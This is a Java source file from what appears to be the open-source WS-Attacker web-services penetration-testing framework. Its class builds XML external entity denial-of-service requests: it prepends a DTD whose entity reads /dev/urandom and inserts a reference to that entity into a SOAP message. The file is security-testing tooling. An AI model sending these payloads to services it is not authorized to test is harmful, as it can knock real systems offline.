/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2013 Christian Altmeier
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.library.intelligentdos.dos;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Iterator;
import java.util.List;

import wsattacker.library.intelligentdos.common.DoSParam;

/**
 * @author Christian Altmeier
 */
public class XmlExternalEntity
    extends AbstractDoSAttack
{

    private static final String XML = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>";

    private static String attribute = "attackEntity";

    private final PayloadPosition[] possiblePossitions = { PayloadPosition.ELEMENT };

    private static final String[] defaultExternalEntities = { "\"/dev/urandom\"" };

    private String[] externalEntities;

    // iterator
    private Iterator<String> externalEntitiesIterator;

    // current
    private String currentExternalEntity;

    public XmlExternalEntity()
    {
        externalEntities = defaultExternalEntities;

        this.externalEntitiesIterator = Arrays.asList( externalEntities ).iterator();
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#getName()
     */
    @Override
    public String getName()
    {
        return "XmlExternalEntity";
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.AbstractDoSAttack#getPossiblePossitions()
     */
    @Override
    public PayloadPosition[] getPossiblePossitions()
    {
        PayloadPosition[] copy = new PayloadPosition[possiblePossitions.length];
        System.arraycopy( possiblePossitions, 0, copy, 0, possiblePossitions.length );
        return copy;
    }

    public String[] getExternalEntities()
    {
        String[] copy = new String[externalEntities.length];
        System.arraycopy( externalEntities, 0, copy, 0, externalEntities.length );
        return copy;
    }

    public void setExternalEntities( String[] elements )
    {
        if ( elements == null || elements.length == 0 )
        {
            throw new IllegalArgumentException( "elements may not be null" );
        }

        this.externalEntities = new String[elements.length];
        System.arraycopy( elements, 0, externalEntities, 0, elements.length );
        this.externalEntitiesIterator = Arrays.asList( elements ).iterator();
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#hasFurtherParams()
     */
    @Override
    public boolean hasFurtherParams()
    {
        return externalEntitiesIterator.hasNext();
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#nextParam()
     */
    @Override
    public void nextParam()
    {
        currentExternalEntity = externalEntitiesIterator.next();
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#getCurrentParams()
     */
    @Override
    public List<DoSParam<?>> getCurrentParams()
    {
        List<DoSParam<?>> list = new ArrayList<DoSParam<?>>();
        list.add( new DoSParam<String>( "External Entity", currentExternalEntity ) );

        return list;
    }

    /*
     * (non-Javadoc)
     * @see
     * wsattacker.library.intelligentdos.dos.AbstractDoSAttack#getCommentLength(wsattacker.library.intelligentdos.dos
     * .DoSAttack.PayloadPosition)
     */
    @Override
    int getCommentLength( PayloadPosition payloadPosition )
    {

        int length = XML.length();
        length += "<!DOCTYPE requestType [ <!ENTITY ".length();
        length += 2 * attribute.length();
        length += " SYSTEM ".length();
        length += currentExternalEntity.length();
        length += ">]>".length();
        length += "&;".length();

        return length;
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#getTamperedRequest(java.lang.String,
     * wsattacker.library.intelligentdos.dos.DoSAttack.PayloadPosition)
     */
    @Override
    public String getTamperedRequest( String xml, PayloadPosition payloadPosition )
    {
        verifyPayloadPosition( payloadPosition );

        // prepend DTD to message
        StringBuilder sb = new StringBuilder();
        sb.append( XML );

        sb.append( "<!DOCTYPE requestType [ " );
        sb.append( "<!ENTITY " ).append( attribute ).append( " SYSTEM " ).append( currentExternalEntity ).append( ">" );
        sb.append( "]>" );

        final String replacePlaceholder = payloadPosition.replacePlaceholder( xml, "&" + attribute + ";" );
        sb.append( replacePlaceholder );

        return sb.toString();
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#minimal()
     */
    @Override
    public DoSAttack minimal()
    {
        XmlExternalEntity xmlExternalEntity = new XmlExternalEntity();
        xmlExternalEntity.currentExternalEntity = this.currentExternalEntity;

        return xmlExternalEntity;
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#middle(wsattacker.library.intelligentdos.dos.DoSAttack)
     */
    @Override
    public DoSAttack middle( DoSAttack aThat )
    {
        XmlExternalEntity xmlExternalEntity = new XmlExternalEntity();
        xmlExternalEntity.currentExternalEntity = this.currentExternalEntity;

        if ( this == aThat )
        {
            return xmlExternalEntity;
        }

        if ( !aThat.getClass().equals( getClass() ) )
        {
            throw new IllegalArgumentException( aThat.getClass() + " is not allowed!" );
        }

        return xmlExternalEntity;
    }

    @Override
    public void initialize()
    {
        super.initialize();

        externalEntitiesIterator = Arrays.asList( externalEntities ).iterator();
    }

    /*
     * (non-Javadoc)
     * @see java.lang.Comparable#compareTo(java.lang.Object)
     */
    @Override
    public int compareTo( DoSAttack aThat )
    {
        // this optimization is usually worthwhile, and can
        // always be added
        if ( this == aThat )
            return EQUAL;

        if ( !aThat.getClass().equals( getClass() ) )
        {
            return EQUAL;
        }

        XmlExternalEntity that = (XmlExternalEntity) aThat;

        return currentExternalEntity.compareTo( that.currentExternalEntity );
    }

}
